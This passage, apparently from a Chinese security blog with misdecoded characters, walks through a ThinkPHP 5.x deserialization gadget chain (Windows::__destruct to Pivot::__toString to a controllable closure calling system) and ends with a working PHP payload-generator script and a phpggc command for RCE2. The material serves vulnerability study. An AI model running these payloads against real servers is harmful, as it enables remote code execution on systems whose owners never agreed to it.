[Pivotå¯¹è±¡]</span></span><br><span class="line"></span><br><span class="line">think\model\concern\Conversion-&gt;<span class="title function_ invoke__">__toString</span>()</span><br><span class="line">    â””â”€â”€ <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>()</span><br><span class="line">         â””â”€â”€ <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>()</span><br><span class="line">              â””â”€â”€ <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>)        <span class="comment">// âœ… éœ€è¦æ„é€ ï¼š</span></span><br><span class="line">                                             <span class="comment">//     $this-&gt;visible = nullï¼ˆç¡®ä¿èµ°é»˜è®¤åˆ†æ”¯ï¼‰</span></span><br><span class="line">                                             <span class="comment">//     $this-&gt;data = [&#x27;smi1e&#x27; =&gt; &#x27;id&#x27;] ï¼ˆä»»æ„é”®å€¼ï¼Œæ§åˆ¶ $keyï¼‰</span></span><br><span class="line">                                             <span class="comment">//     $this-&gt;withAttr = [&#x27;smi1e&#x27; =&gt; &#x27;system&#x27;]ï¼ˆæ§åˆ¶æ‰§è¡Œå‡½æ•°ï¼‰</span></span><br><span class="line"></span><br><span class="line">think\model\concern\Attribute-&gt;<span class="title function_ invoke__">getAttr</span>()</span><br><span class="line">    â””â”€â”€ <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$key</span>)         <span class="comment">// ä» $this-&gt;data[$key] è·å–å€¼ï¼ˆå¦‚ &#x27;id&#x27;ï¼‰</span></span><br><span class="line">    â””â”€â”€ <span class="variable">$fieldName</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$key</span>)  <span class="comment">// è½¬ä¸ºä¸‹åˆ’çº¿å­—æ®µåï¼ˆ&#x27;smi1e&#x27; -&gt; &#x27;smi1e&#x27;ï¼‰</span></span><br><span class="line">    â””â”€â”€ <span class="variable">$closure</span> = <span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>]<span class="comment">// å–å‡º system / åŒ¿åå‡½æ•°</span></span><br><span class="line">    â””â”€â”€ <span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data)         <span class="comment">// âœ… æœ€ç»ˆæ‰§è¡Œç‚¹ï¼Œsystem(&quot;id&quot;, [...])</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="è°ƒç”¨é“¾åˆ†æ"><a href="#è°ƒç”¨é“¾åˆ†æ" class="headerlink" title="è°ƒç”¨é“¾åˆ†æ"></a>è°ƒç”¨é“¾åˆ†æ</h3><p><code>think\process\pipes\Windows</code> ç±»çš„ <code>__destruct</code> å‡½æ•°è°ƒç”¨åˆ°è‡ªèº«çš„ <code>removeFiles</code> å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>(); <span class="comment">// ğŸ‘ˆ è°ƒç”¨ Windows::removeFiles</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>think\process\pipes\Windows::removeFiles</code> å‡½æ•°ä¼šå¯¹ <code>$this-&gt;files</code> æ•°ç»„ä¸­çš„é¡¹è°ƒç”¨ <code>file_exists</code> å‡½æ•°ã€‚ <code>file_exists</code> å‡½æ•°çš„å‚æ•°åº”è¯¥æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œå› æ­¤è¯¥å‡½æ•°å†…éƒ¨ä¼šè§¦å‘å‚æ•°çš„ <code>__toString</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ é™¤ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//  $this-&gt;files æ•°ç»„ä¸­å­˜æ”¾ä¸€ä¸ª think\model\Pivot å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123; <span class="comment">// ğŸ‘ˆ è§¦å‘ Conversion::__toString é­”æœ¯æ–¹æ³•</span></span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>åœ¨ <code>Windows::removeFiles</code> ä¹‹å‰è°ƒç”¨çš„ <code>Windows::close</code> å‡½æ•°ä¼šéå† <code>$this-&gt;fileHandles</code> ç„¶åè°ƒç”¨ <code>fclose</code> å‡½æ•°é‡Šæ”¾èµ„æºï¼Œæˆ‘ä»¬åªéœ€è¦å°† <code>$this-&gt;fileHandles</code> è®¾ç½®ä¸ºç©ºå°±ä¸ä¼šå½±å“åˆ°æˆ‘ä»¬çš„åˆ©ç”¨æµç¨‹ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritdoc</span>&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">parent</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;fileHandles <span class="keyword">as</span> <span class="variable">$handle</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;fileHandles = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>æˆ‘ä»¬å¯ä»¥åœ¨  <code>$this-&gt;files</code> æ•°ç»„ä¸­å­˜æ”¾ä¸€ä¸ª <code>think\model\Pivot</code> å¯¹è±¡ã€‚</p>
<p>ç”±äº <code>Pivot</code> <strong>é€šè¿‡ç»§æ‰¿æŠ½è±¡ç±» <code>Model</code><strong>ï¼Œ</strong>è€Œ <code>Model</code> ä½¿ç”¨äº† <code>think\model\concern\Conversion</code> å’Œ <code>think\model\concern\Attribute</code> è¿™ä¸¤ä¸ª trait</strong>ï¼Œä»è€Œè·å¾—äº†è¿™äº›æ–¹æ³•ï¼š</p>
<ul>
<li><p><code>Pivot-&gt;__toString</code>ï¼š<code>Conversion::__toString</code></p>
</li>
<li><p><code>Pivot-&gt;getAttr</code>ï¼š<code>Attribute::getAttr</code></p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/07/28/ThinkPHP%20%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/images/pivot.png"
                      alt="pivot"
                ></p>
<p>å› æ­¤å‰é¢ <code>Windows::removeFiles</code> è°ƒç”¨çš„ <code>file_exists</code> è§¦å‘äº† <code>$filename</code> ä¹Ÿå°±æ˜¯ <code>Pivot</code> çš„ <code>__toString</code> æ–¹æ³•ã€‚ä»è€Œä¼šæœ‰ <strong><code>Conversion::__toString â†’ Conversion::toJson â†’ Conversion::toArray</code></strong> è°ƒç”¨é“¾ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è½¬æ¢å½“å‰æ¨¡å‹å¯¹è±¡ä¸ºJSONå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  integer $options jsonå‚æ•°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>Conversion::toArray</code> æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡è®¾ç½® <code>$this-&gt;visible = null</code> ä¸” <code>$this-&gt;data</code> ä¸ä¸ºç©ºå°±å¯ä»¥è°ƒç”¨åˆ° <code>Attribute::getAttr</code> æ–¹æ³•ï¼Œå¹¶ä¸”ä¼ å…¥çš„å‚æ•°æ˜¯ <code>$this-&gt;data</code> ä¸­çš„ä¸€ä¸ªé”®ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * è½¬æ¢å½“å‰æ¨¡å‹å¯¹è±¡ä¸ºæ•°ç»„</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸ºäº†ç¡®ä¿ $hasVisible ä¸º false ä¸èƒ½è¿›å…¥è¿™ä¸ªå¾ªç¯ï¼Œå› æ­¤ $this-&gt;visible ä¸ºç©º</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">                <span class="variable">$hasVisible</span>          = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå¹¶å…³è”æ•°æ®</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">            <span class="comment">// è¿›è¿™ä¸ªåˆ†æ”¯è°ƒç”¨ Attribute::getAttr æ–¹æ³•</span></span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Attribute</code> çš„å‡½æ•°ä¼šè°ƒç”¨ <code>$closure</code> å‡½æ•°å˜é‡ï¼Œå¹¶ä¸”ä¼ å…¥å‚æ•° <code>$value</code>ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–å™¨ è·å–æ•°æ®å¯¹è±¡çš„å€¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array  $item æ•°æ®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidArgumentException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="variable">$name</span>, &amp;<span class="variable">$item</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>); <span class="comment">// å–å‡º $this-&gt;data[$name]</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æµ‹å±æ€§è·å–å™¨</span></span><br><span class="line">    <span class="variable">$fieldName</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>); <span class="comment">// é©¼å³°è½¬ä¸‹åˆ’çº¿</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        <span class="variable">$closure</span> = <span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>];</span><br><span class="line">        <span class="variable">$value</span>   = <span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data); <span class="comment">// ğŸš¨ å¯æ§é—­åŒ…è°ƒç”¨ç‚¹</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å‚æ•° <code>$value</code> æ¥è‡ªäº <code>$this-&gt;getData($name)</code>ï¼Œ<code>Attribute::getData</code> ä¼šè¿”å› <code>$this-&gt;data[$name]</code> çš„å€¼ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–å¯¹è±¡åŸå§‹æ•°æ® å¦‚æœä¸å­˜åœ¨æŒ‡å®šå­—æ®µè¿”å›false</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name å­—æ®µå ç•™ç©ºè·å–å…¨éƒ¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidArgumentException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>]; <span class="comment">// ğŸ‘ˆ</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å‡½æ•° <code>$closure</code> æ¥è‡ªäº <code>$this-&gt;withAttr[$fieldName]</code>ï¼Œè€Œ <code>$fieldName</code> æ¥è‡ªäº <code>Loader::parseName($name)</code>ã€‚</p>
<p>å‡½æ•° <code>Loader::parseName()</code> æ˜¯ ThinkPHP ä¸­å¸¸è§çš„ <strong>å‘½åé£æ ¼è½¬æ¢å·¥å…·å‡½æ•°</strong>ï¼Œç”¨äºåœ¨ä¸åŒå‘½åé£æ ¼ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚å› ä¸ºå‚æ•° <code>$type</code> æ²¡æœ‰è®¾ç½®ï¼Œå› æ­¤è¯¥å‡½æ•°æŒ‰ç…§é»˜è®¤çš„ <code>$type = 0</code> å°†å­—ç¬¦ä¸²ä»é©¼å³°è½¬æ¢ä¸ºä¸‹åˆ’çº¿ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å­—ç¬¦ä¸²å‘½åé£æ ¼è½¬æ¢</span></span><br><span class="line"><span class="comment"> * type 0 å°†Javaé£æ ¼è½¬æ¢ä¸ºCçš„é£æ ¼ 1 å°†Cé£æ ¼è½¬æ¢ä¸ºJavaçš„é£æ ¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string  $name å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  integer $type è½¬æ¢ç±»å‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  bool    $ucfirst é¦–å­—æ¯æ˜¯å¦å¤§å†™ï¼ˆé©¼å³°è§„åˆ™ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseName</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$type</span> = <span class="number">0</span>, <span class="variable">$ucfirst</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[A-Z]/&quot;</span>, <span class="string">&quot;_\\0&quot;</span>, <span class="variable">$name</span>), <span class="string">&quot;_&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¹Ÿå°±æ˜¯è¯´ <code>$closure</code> å’Œ <code>$value</code> éƒ½æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è°ƒç”¨ <code>system</code> å‡½æ•°æ‰§è¡Œå‘½ä»¤ã€‚</p>
<h3 id="åˆ©ç”¨è„šæœ¬"><a href="#åˆ©ç”¨è„šæœ¬" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">data</span>, $<span class="title class_">withAttr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;smi1e&#x27;</span> =&gt; <span class="variable">$cmd</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&#x27;smi1e&#x27;</span> =&gt; <span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$cmd</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">payload</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>(&quot;<span class="title class_">calc</span>&quot;);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="RCE2ï¼ˆå½±å“-5-0-xï¼‰"><a href="#RCE2ï¼ˆå½±å“-5-0-xï¼‰" class="headerlink" title="RCE2ï¼ˆå½±å“ 5.0.xï¼‰"></a>RCE2ï¼ˆå½±å“ 5.0.xï¼‰</h2><h3 id="åŸºæœ¬ä¿¡æ¯-1"><a href="#åŸºæœ¬ä¿¡æ¯-1" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><ul>
<li><p><strong>å½±å“èŒƒå›´</strong> ï¼š5.0.24ï¼Œå…¶ä»– 5.0.x çš„ç‰ˆæœ¬ä¹Ÿå¯ä»¥é€‚ç”¨ã€‚</p>
</li>
<li><p><strong>ç”Ÿæˆå‘½ä»¤</strong> ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpggc ThinkPHP/RCE2 system <span class="built_in">id</span> -b -u</span><br></pre></td></tr></table></figure></div>
</li>
